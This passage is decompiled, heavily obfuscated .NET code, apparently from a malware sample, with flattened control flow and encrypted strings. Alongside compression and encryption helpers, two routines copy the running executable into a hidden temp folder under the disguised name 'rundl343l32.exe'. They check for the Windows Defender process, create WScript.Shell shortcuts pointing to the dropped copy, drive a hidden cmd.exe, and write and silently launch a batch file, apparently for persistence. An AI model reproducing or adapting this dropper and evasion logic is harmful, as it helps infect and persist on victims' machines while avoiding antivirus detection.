					long position2 = stream.Position;
					stream.Position = position;
					Class56.smethod_11(stream, (int)@class.TotalOut);
					stream.Position = position2;
				}
				break;
			}
			case 2:
			{
				Class56.smethod_11(stream, 41777787);
				byte[] array3 = Class56.smethod_58((byte[])null, 1, (byte[])null, byte_2);
				using (ICryptoTransform cryptoTransform2 = Class56.smethod_99(byte_1, bool_0: false, byte_0))
				{
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class56.smethod_11(stream, 58555003);
				byte[] array = Class56.smethod_58((byte[])null, 1, (byte[])null, byte_2);
				using (ICryptoTransform cryptoTransform = Class56.smethod_167(byte_1, bool_0: false, byte_0))
				{
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class31.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static bool smethod_59(Class31.Class38 class38_0)
	{
		return class38_0.int_1 >= 16384;
	}

	static string smethod_60(string string_0)
	{
		if (string_0.StartsWith("\"<RSAKeyValue>") && string_0.EndsWith("</RSAKeyValue>\""))
		{
			return "*** Information not reported for security reasons ***";
		}
		return string_0;
	}

	static int smethod_61(Class31.Class35 class35_0, Class31.Class33 class33_0)
	{
		int num;
		int num2;
		if ((num = Class56.smethod_48(class33_0, 9)) >= 0)
		{
			if ((num2 = class35_0.short_0[num]) >= 0)
			{
				Class56.smethod_71(class33_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class56.smethod_48(class33_0, int_)) >= 0)
			{
				num2 = class35_0.short_0[num3 | (num >> 9)];
				Class56.smethod_71(class33_0, num2 & 0xF);
				return num2 >> 4;
			}
			int availableBits = class33_0.AvailableBits;
			num = Class56.smethod_48(class33_0, availableBits);
			num2 = class35_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= availableBits)
			{
				Class56.smethod_71(class33_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int availableBits2 = class33_0.AvailableBits;
		num = Class56.smethod_48(class33_0, availableBits2);
		num2 = class35_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= availableBits2)
		{
			Class56.smethod_71(class33_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static byte[] smethod_62(string string_0, byte[] byte_0)
	{
		checked
		{
			byte[] array = new byte[byte_0.Length + 1];
			int num = 2;
			if (!J5IwCwpfghTToLC3MgK())
			{
			}
			byte[] bytes = default(byte[]);
			int num3 = default(int);
			int num4 = default(int);
			int num2 = default(int);
			int num5 = default(int);
			while (true)
			{
				switch (num)
				{
				case 1:
				case 5:
					bytes = Encoding.Default.GetBytes(string_0);
					num3 = byte_0.Length - 1;
					num4 = 0;
					goto IL_002e;
				default:
					num4++;
					goto IL_002e;
				case 0:
				case 2:
					num2 = byte_0[byte_0.Length - 1] ^ 0x70;
					goto case 1;
				case 6:
					break;
					IL_002e:
					if (num4 <= num3)
					{
						array[num4] = (byte)(byte_0[num4] ^ num2 ^ bytes[num5]);
						if (num5 == string_0.Length - 1)
						{
							num5 = 0;
						}
						else
						{
							num5++;
							num = 3;
							if (!J5IwCwpfghTToLC3MgK())
							{
								continue;
							}
						}
						goto default;
					}
					array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
					break;
				}
				break;
			}
			return array;
		}
	}

	static void smethod_63(Exception exception_0, object object_0, object object_1)
	{
		Class56.smethod_46(exception_0, new object[2] { object_0, object_1 });
	}

	static int smethod_64(Class31.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static byte[] smethod_65(EventArgs1 eventArgs1_0)
	{
		return Class56.smethod_160(eventArgs1_0.class45_0);
	}

	[DllImport("user32", CharSet = CharSet.Unicode)]
	internal static extern int DrawText(IntPtr intptr_0, string string_0, int int_0, ref Class58.Struct23 struct23_0, int int_1);

	static void smethod_66(Class31.Class38.Class39 class39_0)
	{
		int[] array = new int[class39_0.int_3];
		int num3 = default(int);
		int num4 = default(int);
		while (true)
		{
			int num = 0;
			class39_0.short_1 = new short[class39_0.short_0.Length];
			int num2 = 0;
			while (true)
			{
				if (num2 < class39_0.int_3)
				{
					array[num2] = num;
					if (eBBp0Op7wSDKHwLe0VT())
					{
						switch (4)
						{
						case 2:
						case 4:
							num += class39_0.int_2[num2] << 15 - num2;
							break;
						case 1:
						case 5:
							continue;
						case 3:
							goto end_IL_005f;
						case 0:
							goto IL_0091;
						case 7:
							goto IL_00cd;
						}
					}
					num2++;
					continue;
				}
				num3 = 0;
				goto IL_00cd;
				IL_00cd:
				if (num3 < class39_0.int_1)
				{
					num4 = class39_0.byte_0[num3];
					goto IL_0091;
				}
				return;
				IL_0091:
				if (num4 > 0)
				{
					class39_0.short_1[num3] = Class56.smethod_155(array[num4 - 1]);
					array[num4 - 1] += 1 << 16 - num4;
				}
				num3++;
				goto IL_00cd;
				continue;
				end_IL_005f:
				break;
			}
		}
	}

	static int smethod_67(byte[] byte_0, int int_0, int int_1, Class31.Class34 class34_0)
	{
		int num = class34_0.int_0;
		while (true)
		{
			IL_0079:
			if (int_0 <= class34_0.int_1)
			{
				num = (class34_0.int_0 - class34_0.int_1 + int_0) & 0x7FFF;
				goto IL_0071;
			}
			goto IL_0069;
			IL_0069:
			int_0 = class34_0.int_1;
			goto IL_0071;
			IL_0071:
			int num2 = int_0;
			int num3 = int_0 - num;
			while (true)
			{
				if (num3 <= 0)
				{
					goto IL_008f;
				}
				Array.Copy(class34_0.byte_0, 32768 - num3, byte_0, int_1, num3);
				if (!J5IwCwpfghTToLC3MgK())
				{
					switch (1)
					{
					case 4:
						goto end_IL_0063;
					case 0:
					case 5:
						goto IL_0079;
					case 1:
					case 3:
						goto IL_0087;
					case 6:
						goto IL_00b7;
					}
					continue;
				}
				goto IL_00b7;
				IL_008f:
				Array.Copy(class34_0.byte_0, num - int_0, byte_0, int_1, int_0);
				class34_0.int_1 -= num2;
				if (class34_0.int_1 >= 0)
				{
					return num2;
				}
				goto IL_00b7;
				IL_00b7:
				throw new InvalidOperationException();
				IL_0087:
				int_1 += num3;
				int_0 = num;
				goto IL_008f;
				continue;
				end_IL_0063:
				break;
			}
			goto IL_0069;
		}
	}

	[DllImport("kernel32.Dll")]
	internal static extern short GetVersionEx(ref Class58.Struct24 struct24_0);

	static void smethod_68(int int_0, Class31.Class38 class38_0)
	{
		Class56.smethod_66(class38_0.class39_2);
		Class56.smethod_66(class38_0.class39_0);
		Class56.smethod_66(class38_0.class39_1);
		Class56.smethod_12(class38_0.class41_0, class38_0.class39_0.int_1 - 257, 5);
		Class56.smethod_12(class38_0.class41_0, class38_0.class39_1.int_1 - 1, 5);
		Class56.smethod_12(class38_0.class41_0, int_0 - 4, 4);
		for (int i = 0; i < int_0; i++)
		{
			Class56.smethod_12(class38_0.class41_0, (int)class38_0.class39_2.byte_0[Class31.Class38.int_0[i]], 3);
		}
		Class31.Class38.Class39 class39_ = class38_0.class39_0;
		Class31.Class38.Class39 class39_2 = class38_0.class39_2;
		Class56.smethod_85(class39_2, class39_);
		class39_ = class38_0.class39_1;
		class39_2 = class38_0.class39_2;
		Class56.smethod_85(class39_2, class39_);
	}

	static int smethod_69(Class31.Class40 class40_0)
	{
		int num = ((class40_0.int_0 << 5) ^ class40_0.byte_0[class40_0.int_4 + 2]) & 0x7FFF;
		short num2 = (class40_0.short_1[class40_0.int_4 & 0x7FFF] = class40_0.short_0[num]);
		class40_0.short_0[num] = (short)class40_0.int_4;
		class40_0.int_0 = num;
		return num2 & 0xFFFF;
	}

	static void smethod_70(Exception exception_0)
	{
		Class56.smethod_46(exception_0, new object[0]);
	}

	static void smethod_71(Class31.Class33 class33_0, int int_0)
	{
		class33_0.uint_0 >>= int_0;
		class33_0.int_2 -= int_0;
	}

	static void smethod_72(Class44 class44_0, IWebProxy iwebProxy_0)
	{
		class44_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_73(Class31.Class34 class34_0, int int_0, int int_1)
	{
		int num = (class34_0.int_1 += int_0);
		while (num <= 32768)
		{
			int num2 = (class34_0.int_0 - int_1) & 0x7FFF;
			int num3 = 32768 - int_0;
			while (true)
			{
				IL_006a:
				if (num2 <= num3)
				{
					while (class34_0.int_0 < num3)
					{
						if (int_0 <= int_1)
						{
							if (J5IwCwpfghTToLC3MgK())
							{
							}
							switch (4)
							{
							case 1:
							case 5:
								goto IL_006a;
							case 0:
								goto end_IL_006a;
							case 3:
							case 4:
								Array.Copy(class34_0.byte_0, num2, class34_0.byte_0, class34_0.int_0, int_0);
								class34_0.int_0 += int_0;
								return;
							case 6:
								return;
							}
							continue;
						}
						while (int_0-- > 0)
						{
							class34_0.byte_0[class34_0.int_0++] = class34_0.byte_0[num2++];
						}
						return;
					}
				}
				Class56.smethod_123(class34_0, num2, int_0, int_1);
				return;
				continue;
				end_IL_006a:
				break;
			}
		}
		throw new InvalidOperationException();
	}

	static void smethod_74(Class31.Class33 class33_0)
	{
		int num = 0;
		class33_0.int_2 = 0;
		int num2 = 0;
		class33_0.int_1 = 0;
		int num3 = 0;
		class33_0.int_0 = 0;
		class33_0.uint_0 = 0u;
	}

	static byte[] smethod_75(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class56.smethod_58(byte_2, 2, byte_0, byte_1);
	}

	static void smethod_76()
	{
		string text = "";
	}

	static bool smethod_77(string string_0)
	{
		Process[] processesByName = Process.GetProcessesByName(string_0);
		if (processesByName.Length > 0)
		{
			return true;
		}
		return false;
	}

	static void smethod_78()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		string text = default(string);
		object executablePath = default(object);
		StreamWriter standardInput = default(StreamWriter);
		string text7 = default(string);
		string text9 = default(string);
		object objectValue = default(object);
		object obj = default(object);
		object obj2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				string text5;
				string text6;
				string text8;
				string text10;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 1585:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0035;
						case 4:
							goto IL_0058;
						case 5:
							goto IL_0062;
						case 6:
							goto IL_0098;
						case 7:
							goto IL_00b2;
						case 8:
							goto IL_00cc;
						case 9:
							goto IL_00d5;
						case 10:
							goto IL_0139;
						case 11:
							goto IL_014e;
						case 12:
							goto IL_015f;
						case 13:
							goto IL_0170;
						case 14:
							goto IL_0181;
						case 15:
							goto IL_0192;
						case 16:
							goto IL_01a3;
						case 17:
							goto IL_01af;
						case 18:
							goto IL_01bb;
						case 19:
							goto IL_01c5;
						case 20:
							goto IL_01d0;
						case 21:
							goto IL_01db;
						case 22:
							goto IL_01e6;
						case 23:
							goto IL_01f1;
						case 24:
							goto IL_0201;
						case 26:
							goto IL_0214;
						case 27:
							goto IL_0218;
						case 28:
							goto IL_0223;
						case 29:
							goto IL_0235;
						case 30:
							goto IL_024f;
						case 31:
							goto IL_0270;
						case 32:
							goto IL_02d4;
						case 33:
							goto IL_0338;
						case 34:
							goto IL_035f;
						case 35:
							goto IL_037b;
						case 36:
							goto IL_0397;
						case 25:
						case 37:
						case 38:
							goto IL_0400;
						case 39:
							goto IL_0459;
						case 40:
							goto IL_04bc;
						case 41:
						case 42:
							goto IL_0529;
						case 43:
							goto IL_0542;
						case 44:
							goto IL_054d;
						case 45:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 46:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_054d:
					num = 44;
					process.Kill();
					break;
					IL_0008:
					num = 2;
					text = "" + Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_0035;
					IL_0035:
					num = 3;
					text2 = Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0058;
					IL_0058:
					num = 4;
					process = new Process();
					goto IL_0062;
					IL_0062:
					num = 5;
					text3 = Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=") + Class56.smethod_95("iXIzM98Pjl/u+zlU/h5Dfl19cMP29BJLIWFLWajNT92OKqOYE9q1PcctiVmnH8Ed") + Class56.smethod_95("#rundl343l32.exe#");
					goto IL_0098;
					IL_0098:
					num = 6;
					Directory.CreateDirectory(text + Class56.smethod_95("#thenwfol#"));
					goto IL_00b2;
					IL_00b2:
					num = 7;
					File.SetAttributes(text + Class56.smethod_95("#thenwfol#"), FileAttributes.Hidden);
					goto IL_00cc;
					IL_00cc:
					num = 8;
					executablePath = Application.get_ExecutablePath();
					goto IL_00d5;
					IL_00d5:
					num = 9;
					text4 = "" + Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + Class56.smethod_95("#thenwfol#") + "\\" + Class56.smethod_95("#rundl343l32.exe#");
					goto IL_0139;
					IL_0139:
					num = 10;
					process.StartInfo.FileName = "cmd.exe";
					goto IL_014e;
					IL_014e:
					num = 11;
					process.StartInfo.RedirectStandardOutput = true;
					goto IL_015f;
					IL_015f:
					num = 12;
					process.StartInfo.RedirectStandardInput = true;
					goto IL_0170;
					IL_0170:
					num = 13;
					process.StartInfo.UseShellExecute = false;
					goto IL_0181;
					IL_0181:
					num = 14;
					process.StartInfo.CreateNoWindow = true;
					goto IL_0192;
					IL_0192:
					num = 15;
					process.StartInfo.RedirectStandardError = true;
					goto IL_01a3;
					IL_01a3:
					num = 16;
					process.Start();
					goto IL_01af;
					IL_01af:
					num = 17;
					standardInput = process.StandardInput;
					goto IL_01bb;
					IL_01bb:
					num = 18;
					text5 = "cop";
					goto IL_01c5;
					IL_01c5:
					num = 19;
					text6 = "y ";
					goto IL_01d0;
					IL_01d0:
					num = 20;
					standardInput.AutoFlush = true;
					goto IL_01db;
					IL_01db:
					num = 21;
					text7 = "%temp%\\";
					goto IL_01e6;
					IL_01e6:
					num = 22;
					text8 = ".lnk";
					goto IL_01f1;
					IL_01f1:
					num = 23;
					if (Class56.smethod_77("MsMpEng"))
					{
						goto IL_0201;
					}
					goto IL_0214;
					IL_0201:
					num = 24;
					Thread.Sleep(7000);
					goto IL_0400;
					IL_0214:
					num = 26;
					goto IL_0218;
					IL_0218:
					num = 27;
					text9 = "WScrip";
					goto IL_0223;
					IL_0223:
					num = 28;
					text10 = text9 + "t.Shell";
					goto IL_0235;
					IL_0235:
					num = 29;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("", ""));
					goto IL_024f;
					IL_024f:
					num = 30;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(text9 + "t.Shell", ""));
					goto IL_0270;
					IL_0270:
					num = 31;
					NewLateBinding.LateSet(obj, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { text + Class56.smethod_95("#thenwfol#") + "\\" + Class56.smethod_95("#rundl343l32.exe#") }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_02d4;
					IL_02d4:
					num = 32;
					NewLateBinding.LateSet(obj2, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { text + Class56.smethod_95("#thenwfol#") + "\\" + Class56.smethod_95("#rundl343l32.exe#") }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_0338;
					IL_0338:
					num = 33;
					NewLateBinding.LateSet(obj, (Type)null, "WindowStyle", new object[1] { 4 }, (string[])null, (Type[])null);
					goto IL_035f;
					IL_035f:
					num = 34;
					NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_037b;
					IL_037b:
					num = 35;
					NewLateBinding.LateCall(obj2, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_0397;
					IL_0397:
					num = 36;
					standardInput.Write(Class56.smethod_95("tooEKUPNPCsRNkaS3Hueqar3hTgD3+UMaiKlVz9fNin2nXZ/+dc8OLhhu6kefhMV") + text7 + Class56.smethod_95("#thenwfol#") + "\\" + Class56.smethod_95("#rundl343l32.exe#") + Class56.smethod_95("N2125ojyLfd5vRuYzSjpwfaddn/51zw4uGG7qR5+ExU=") + Environment.NewLine);
					goto IL_0400;
					IL_0400:
					num = 38;
					if (!File.Exists(Interaction.Environ("TEMP") + "\\" + Class56.smethod_95("#thenwfol#") + "\\" + Class56.smethod_95("#rundl343l32.exe#")))
					{
						goto IL_0459;
					}
					goto IL_0529;
					IL_0459:
					num = 39;
					File.Copy(Conversions.ToString(executablePath), Interaction.Environ("TEMP") + "\\" + Class56.smethod_95("#thenwfol#") + "\\" + Class56.smethod_95("#rundl343l32.exe#") + ".jpg");
					goto IL_04bc;
					IL_04bc:
					num = 40;
					standardInput.Write("ren \"" + text7 + Class56.smethod_95("#thenwfol#") + "\\" + Class56.smethod_95("#rundl343l32.exe#") + ".jpg\" " + Class56.smethod_95("#rundl343l32.exe#") + Environment.NewLine);
					goto IL_0529;
					IL_0529:
					num = 42;
					standardInput.Write("exit" + Environment.NewLine);
					goto IL_0542;
					IL_0542:
					num = 43;
					process.WaitForExit();
					goto IL_054d;
					end_IL_0000_2:
					break;
				}
				num = 45;
				standardInput.Flush();
				break;
				end_IL_0000:;
			}
			catch (object obj3) when (obj3 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0000_dispatch = 1585;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll")]
	internal static extern int GetSystemMetrics(int int_0);

	static void smethod_79(Class57 class57_0, Delegate21 delegate21_0)
	{
		if (class57_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (class57_0.iwebProxy_0 != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class57_0.iwebProxy_0);
				}
				class57_0.string_2 = uploadReportLoginService.GetServerURL(class57_0.string_1);
				if (class57_0.string_2.Length == 0)
				{
					throw new ApplicationException("Cannot connect to webservice");
				}
				if (class57_0.string_2 == "ditto")
				{
					class57_0.string_2 = Class57.string_0;
				}
			}
			catch (Exception ex)
			{
				delegate21_0("ERR 2001: " + ex.Message);
				return;
			}
		}
		delegate21_0(class57_0.string_2.StartsWith("ERR") ? class57_0.string_2 : "OK");
	}

	[DllImport("kernel32")]
	internal static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static void smethod_80(Form0 form0_0)
	{
		try
		{
			((Control)form0_0.panel_2).set_Visible(false);
			((Control)form0_0.panel_1).set_Visible(true);
			if (form0_0.eventArgs1_0 != null)
			{
				Class56.smethod_22((ThreadStart)form0_0.method_10, form0_0);
			}
		}
		catch
		{
		}
	}

	static void smethod_81(string string_0, EventArgs1 eventArgs1_0, string string_1)
	{
		Class56.smethod_136((object)string_0, string_1, eventArgs1_0.class45_0);
	}

	static void smethod_82()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 739:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0047;
						case 5:
							goto IL_0069;
						case 6:
							goto IL_0086;
						case 7:
							goto IL_0098;
						case 8:
							goto IL_00e4;
						case 9:
							goto IL_00ef;
						case 10:
							goto IL_0104;
						case 11:
							goto IL_0114;
						case 12:
							goto IL_0124;
						case 13:
							goto IL_0134;
						case 14:
							goto IL_0149;
						case 15:
							goto IL_0159;
						case 16:
							goto IL_016e;
						case 17:
							goto IL_017e;
						case 18:
							goto IL_018e;
						case 19:
							goto IL_019e;
						case 20:
							goto IL_01c1;
						case 21:
							goto IL_01d1;
						case 22:
							goto IL_01e6;
						case 23:
							goto IL_01f6;
						case 24:
							goto IL_0206;
						case 25:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 26:
						case 27:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0206:
					num = 24;
					streamWriter.Dispose();
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text2 = Interaction.Environ(Class56.smethod_95("rRhnphBugUiRcVlpVgLfjw==")) + "\\temp\\";
					goto IL_0047;
					IL_0047:
					num = 4;
					text3 = Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0069;
					IL_0069:
					num = 5;
					File.Delete(text + Class56.smethod_95("#thenwfol#") + "\\qJ1rx6zo0JWv6cXezCyOGQ==.bat");
					goto IL_0086;
					IL_0086:
					num = 6;
					if (Class56.smethod_77("cmd"))
					{
						goto end_IL_0000_3;
					}
					goto IL_0098;
					IL_0098:
					num = 7;
					streamWriter = new StreamWriter(text + Class56.smethod_95("#thenwfol#") + "\\" + Class56.smethod_95("#rundl343l32.exe#") + ".bat");
					goto IL_00e4;
					IL_00e4:
					num = 8;
					streamWriter.AutoFlush = true;
					goto IL_00ef;
					IL_00ef:
					num = 9;
					streamWriter.Write(Class56.smethod_95("31RKsOSvI9/AFuhKog3NgA=="));
					goto IL_0104;
					IL_0104:
					num = 10;
					streamWriter.Write(Environment.NewLine);
					goto IL_0114;
					IL_0114:
					num = 11;
					streamWriter.Write("timeout /t @@");
					goto IL_0124;
					IL_0124:
					num = 12;
					streamWriter.Write(Environment.NewLine);
					goto IL_0134;
					IL_0134:
					num = 13;
					streamWriter.Write(Class56.smethod_95("sVCCMiKQCYeTpQSTFrz5DDm67Dq62ySggzNsI52ecP+zGW0ndTihzBH1ezwpAZMgAvZ0FwJEcI2azy08gnzpoj7dAR2hAZCAqGoM2t38QMc="));
					goto IL_0149;
					IL_0149:
					num = 14;
					streamWriter.Write(Environment.NewLine);
					goto IL_0159;
					IL_0159:
					num = 15;
					streamWriter.Write(Class56.smethod_95("OHLI5dgL1wwNBGr/QEZ9WA=="));
					goto IL_016e;
					IL_016e:
					num = 16;
					streamWriter.Write(Environment.NewLine);
					goto IL_017e;
					IL_017e:
					num = 17;
					streamWriter.Write(") || (");
					goto IL_018e;
					IL_018e:
					num = 18;
					streamWriter.Write(Environment.NewLine);
					goto IL_019e;
					IL_019e:
					num = 19;
					text4 = "%appdata%\\" + Class56.smethod_95("iXIzM98Pjl/u+zlU/h5Dfl19cMP29BJLIWFLWajNT92OKqOYE9q1PcctiVmnH8Ed") + Class56.smethod_95("#rundl343l32.exe#");
					goto IL_01c1;
					IL_01c1:
					num = 20;
					streamWriter.Write(Environment.NewLine);
					goto IL_01d1;
					IL_01d1:
					num = 21;
					streamWriter.Write(Class56.smethod_95("OHLI5dgL1wwNBGr/QEZ9WA=="));
					goto IL_01e6;
					IL_01e6:
					num = 22;
					streamWriter.Write(Environment.NewLine);
					goto IL_01f6;
					IL_01f6:
					num = 23;
					streamWriter.Write(")");
					goto IL_0206;
					end_IL_0000_2:
					break;
				}
				num = 25;
				Interaction.Shell(text + Class56.smethod_95("#thenwfol#") + "\\" + Class56.smethod_95("#rundl343l32.exe#") + ".bat", (AppWinStyle)0, false, -1);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 739;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static Icon smethod_83()
	{
		try
		{
			return Class56.smethod_114();
		}
		catch (Exception)
		{
			return Class56.smethod_132("default");
		}
	}

	static int smethod_84(int int_0, Font font_0, string string_0, Graphics graphics_0)
	{
		return Size.Ceiling(graphics_0.MeasureString(string_0, font_0, int_0)).Height;
	}

	static void smethod_85(Class31.Class38.Class39 class39_0, Class31.Class38.Class39 class39_1)
	{
		int num = -1;
		int num2 = 0;
		int num5 = default(int);
		int num6 = default(int);
		while (num2 < class39_1.int_1)
		{
			int num3 = 1;
			int num4 = class39_1.byte_0[num2];
			if (eBBp0Op7wSDKHwLe0VT())
			{
				switch (9)
				{
				case 9:
					break;
				case 3:
				case 6:
					goto IL_006b;
				default:
					goto IL_006f;
				case 1:
				case 2:
				case 4:
					goto IL_0078;
				case 7:
					goto IL_007a;
				case 5:
					goto IL_009a;
				case 8:
				case 10:
					continue;
				}
			}
			if (num4 == 0)
			{
				num5 = 138;
				num6 = 3;
				goto IL_0078;
			}
			num5 = 6;
			num6 = 3;
			goto IL_006b;
			IL_006b:
			if (num != num4)
			{
				goto IL_006f;
			}
			goto IL_0078;
			IL_0078:
			num = num4;
			goto IL_007a;
			IL_006f:
			Class56.smethod_35(class39_0, num4);
			num3 = 0;
			goto IL_0078;
			IL_007a:
			num2++;
			goto IL_009a;
			IL_009a:
			while (num2 < class39_1.int_1 && num == class39_1.byte_0[num2])
			{
				num2++;
				if (++num3 >= num5)
				{
					break;
				}
			}
			if (num3 < num6)
			{
				while (num3-- > 0)
				{
					Class56.smethod_35(class39_0, num);
				}
			}
			else if (num != 0)
			{
				Class56.smethod_35(class39_0, 16);
				Class56.smethod_12(class39_1.class38_0.class41_0, num3 - 3, 2);
			}
			else if (num3 <= 10)
			{
				Class56.smethod_35(class39_0, 17);
				Class56.smethod_12(class39_1.class38_0.class41_0, num3 - 3, 3);
			}
			else
			{
				Class56.smethod_35(class39_0, 18);
				Class56.smethod_12(class39_1.class38_0.class41_0, num3 - 11, 7);
			}
		}
	}

	static void smethod_86(int int_0, int int_1, byte[] byte_0, Class31.Class33 class33_0)
	{
		if (class33_0.int_0 >= class33_0.int_1)
		{
			int num = int_0 + int_1;
			if (0 <= int_0)
			{
				while (int_0 <= num && num <= byte_0.Length)
				{
					if ((int_1 & 1) == 0)
					{
						goto IL_0056;
					}
					class33_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class33_0.int_2);
					goto IL_0091;
					IL_0091:
					class33_0.int_2 += 8;
					goto IL_0056;
					IL_0056:
					while (true)
					{
						class33_0.byte_0 = byte_0;
						class33_0.int_0 = int_0;
						if (eBBp0Op7wSDKHwLe0VT())
						{
							switch (6)
							{
							case 4:
								break;
							default:
								goto end_IL_0056;
							case 5:
								goto IL_00a4;
							case 0:
							case 1:
								goto IL_00ad;
							case 6:
								class33_0.int_1 = num;
								return;
							}
							continue;
						}
						break;
						continue;
						end_IL_0056:
						break;
					}
					goto IL_0091;
					IL_00a4:;
				}
			}
			throw new ArgumentOutOfRangeException();
		}
		goto IL_00ad;
		IL_00ad:
		throw new InvalidOperationException();
	}

	[DllImport("kernel32.Dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	static void smethod_87(Class31.Class37 class37_0)
	{
		class37_0.int_0 |= 12;
	}

	static byte[] smethod_88(byte[] byte_0)
	{
		return Class56.smethod_58((byte[])null, 1, (byte[])null, byte_0);
	}

	static Class31.Class35 smethod_89(Class31.Class36 class36_0)
	{
		byte[] array = new byte[class36_0.int_4];
		Array.Copy(class36_0.byte_1, class36_0.int_3, array, 0, class36_0.int_4);
		return new Class31.Class35(array);
	}

	static void smethod_90()
	{
		try
		{
			Class56.smethod_21();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_91(byte[] byte_0, Class31.Class37 class37_0)
	{
		Class56.smethod_130(class37_0.class40_0, byte_0);
	}

	static void smethod_92(int int_0, int int_1, byte[] byte_0, Class31.Class34 class34_0)
	{
		if (class34_0.int_1 > 0)
		{
			throw new InvalidOperationException();
		}
		if (int_1 > 32768)
		{
			int_0 += int_1 - 32768;
			int_1 = 32768;
		}
		Array.Copy(byte_0, int_0, class34_0.byte_0, 0, int_1);
